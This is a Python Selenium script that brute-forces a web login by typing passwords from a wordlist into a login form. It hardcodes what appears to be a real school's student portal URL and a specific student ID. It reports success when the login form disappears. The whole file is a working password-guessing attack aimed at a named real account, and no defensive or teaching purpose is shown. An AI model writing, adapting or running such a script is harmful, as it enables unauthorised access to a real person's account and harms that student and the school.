import datetime
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service
from selenium.common.exceptions import NoSuchElementException

# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    WHITE = '\33[37m'


# Config#
parser = OptionParser()
now = datetime.datetime.now()


# Args
parser.add_option('-l', '--username', dest='username',
                  help='Choose the username')
parser.add_option('-u', '--usernamesel', dest='usernamesel',
                  help='Choose the username selector')
parser.add_option('-p', '--passsel', dest='passsel',
                  help='Choose the password selector')
parser.add_option('-b', '--loginsel', dest='loginsel',
                  help='Choose the login button selector')
parser.add_option('-P', '--passlist', dest='passlist',
                  help='Enter the password list directory')
parser.add_option('-w', '--website', dest='website', help='choose a website')
(c_options, args) = parser.parse_args()

BROWSER_DVR_DIR = 'C:\\webdrivers\\BROWSERdriver.exe'
def brute():
    options = webdriver.EdgeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    try:
        global driver
        driver = Service(BROWSER_DVR_DIR)
    except:
        print(f'{color.RED}\n[?] {color.WHITE}Webdriver binary couldn\'t be found.')
    browser = webdriver.Edge(service=driver)
    temp = ''
    browser.get('https://www.dpsbulandshahr.com/SMS/student')
    user = c_options.username
    userStr = c_options.usernamesel
    passStr = c_options.passsel
    lBtnStr = c_options.loginsel
    website = c_options.website
    passList = c_options.passlist

    passFile = open(passList, 'r')
    while True:
        try:
            for passTryOption in passFile:
                try:
                    UserSltr = browser.find_element(By.NAME, 'id')
                    PassSltr = browser.find_element(By.NAME, 'password')
                    btn = browser.find_element(By.NAME, 'login')
                    UserSltr.send_keys('22-12685')
                    PassSltr.send_keys(passTryOption)
                    temp = passTryOption
                    print(f'{color.CYAN}Tried: {color.WHITE + temp}')
                except KeyboardInterrupt:
                    print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
                    exit()
                except NoSuchElementException:
                    print(
                        f'{color.GREEN}[✅] Password has been found: {color.WHITE + temp}')
                    return temp
                    exit()
        except KeyboardInterrupt:
            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
            exit()
brute()